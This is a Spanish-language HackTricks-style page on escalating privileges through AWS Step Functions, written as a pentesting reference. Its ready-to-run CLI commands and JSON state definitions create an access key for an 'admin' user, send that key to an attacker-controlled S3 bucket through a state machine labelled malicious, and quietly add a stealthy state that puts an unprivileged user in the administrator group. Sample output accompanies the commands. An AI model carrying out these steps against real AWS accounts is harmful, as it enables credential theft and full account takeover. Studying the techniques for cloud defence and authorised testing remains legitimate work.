# AWS - Step Functions Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

For more information about this AWS service, check:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### Task Resources

Estas técnicas de escalada de privilegios requieren usar algunos recursos de Step Functions de AWS para realizar las acciones de escalada de privilegios deseadas.

Para comprobar todas las acciones posibles, puedes ir a tu propia cuenta de AWS, seleccionar la acción que quieras usar y ver los parámetros que está utilizando, como en:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

O también puedes consultar la documentación de la API de AWS y revisar la documentación de cada acción:

- [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AddUserToGroup.html)
- [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

Un atacante con los permisos **`states:TestState`** y **`iam:PassRole`** puede probar cualquier state y pasarle cualquier rol de IAM sin crear ni actualizar una máquina de estados existente, lo que potencialmente permite el acceso no autorizado a otros servicios de AWS con los permisos del rol. Combinados, estos permisos pueden conducir a acciones no autorizadas extensas, desde manipular flujos de trabajo para alterar datos hasta filtraciones de datos, manipulación de recursos y escalada de privilegios.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Los siguientes ejemplos muestran cómo probar un estado que crea una clave de acceso para el usuario **`admin`** aprovechando estos permisos y un rol permisivo del entorno AWS. Este rol permisivo debería tener asociada alguna política de alto privilegio (por ejemplo **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permita al estado ejecutar la acción **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Comando** ejecutado para realizar el privesc:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
**Impacto potencial**: Ejecución y manipulación no autorizada de flujos de trabajo y acceso a recursos sensibles, lo que podría derivar en brechas de seguridad significativas.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Un atacante con **`states:CreateStateMachine`** y **`iam:PassRole`** podría crear una máquina de estados y asignarle cualquier rol de IAM, permitiendo acceso no autorizado a otros servicios de AWS con los permisos del rol. A diferencia de la técnica de escalada previa (**`states:TestState`** y **`iam:PassRole`**), esta no se ejecuta por sí sola; también necesitarás tener los permisos **`states:StartExecution`** o **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **no está disponible para workflows estándar**, **solo para express state machines**) para poder iniciar una ejecución sobre la máquina de estados.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Los siguientes ejemplos muestran cómo crear una state machine que crea una access key para el usuario **`admin`** y exfiltra dicha access key a un S3 bucket controlado por el atacante, aprovechando estos permisos y un rol permisivo del entorno AWS. Este rol permisivo debería tener asociada alguna política de alto privilegio (por ejemplo **`arn:aws:iam::aws:policy/AdministratorAccess`**) que permita a la state machine realizar las acciones **`iam:CreateAccessKey`** y **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Comando** ejecutado para **crear la máquina de estados**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Comando** ejecutado para **iniciar una ejecución** de la máquina de estado creada previamente:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
> [!WARNING]
> El bucket S3 controlado por el atacante debería tener permisos para aceptar una acción s3:PutObject desde la cuenta de la víctima.

**Impacto potencial**: Ejecución y manipulación no autorizada de workflows y acceso a recursos sensibles, lo que puede conducir a brechas de seguridad significativas.

### `states:UpdateStateMachine` & (no siempre requerido) `iam:PassRole`

Un atacante con el permiso **`states:UpdateStateMachine`** podría modificar la definición de una state machine, pudiendo añadir estados adicionales sigilosos que podrían terminar en una escalada de privilegios. De este modo, cuando un usuario legítimo inicie una ejecución de la state machine, este nuevo estado malicioso y sigiloso se ejecutará y la escalada de privilegios tendrá éxito.

Dependiendo de lo permisivo que sea el IAM Role asociado a la state machine, un atacante se enfrentaría a 2 situaciones:

1. **IAM Role permisivo**: Si el IAM Role asociado a la state machine ya es permisivo (por ejemplo tiene adjunta la policy **`arn:aws:iam::aws:policy/AdministratorAccess`**), entonces el permiso **`iam:PassRole`** no sería necesario para escalar privilegios, ya que no sería necesario actualizar también el IAM Role; con modificar la definición de la state machine es suficiente.
2. **IAM Role no permisivo**: En contraste con el caso anterior, aquí un atacante también requeriría el permiso **`iam:PassRole`** ya que sería necesario asociar un IAM Role permisivo a la state machine además de modificar la definición de la state machine.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Los siguientes ejemplos muestran cómo actualizar una máquina de estados legítima que solo invoca una función HelloWorld de Lambda, con el fin de añadir un estado extra que agrega al usuario **`unprivilegedUser`** al **`administrator`** IAM Group. De esta forma, cuando un usuario legítimo inicie la ejecución de la máquina de estados actualizada, este nuevo estado malicioso y sigiloso se ejecutará y la escalada de privilegios será exitosa.

> [!WARNING]
> Si la state machine no tiene asociada una IAM Role permisiva, también se requeriría el permiso **`iam:PassRole`** para actualizar la IAM Role y así asociar una IAM Role permisiva (por ejemplo una con la **`arn:aws:iam::aws:policy/AdministratorAccess`** policy adjunta).

{{#tabs }}
{{#tab name="Legit State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}

{{#tab name="Malicious Updated State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}
{{#endtabs }}

- **Comando** ejecutado para **actualizar** **la state machine legítima**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
**Potential Impact**: Ejecución y manipulación no autorizadas de flujos de trabajo y acceso a recursos sensibles, lo que podría conducir a brechas de seguridad significativas.

{{#include ../../../../banners/hacktricks-training.md}}
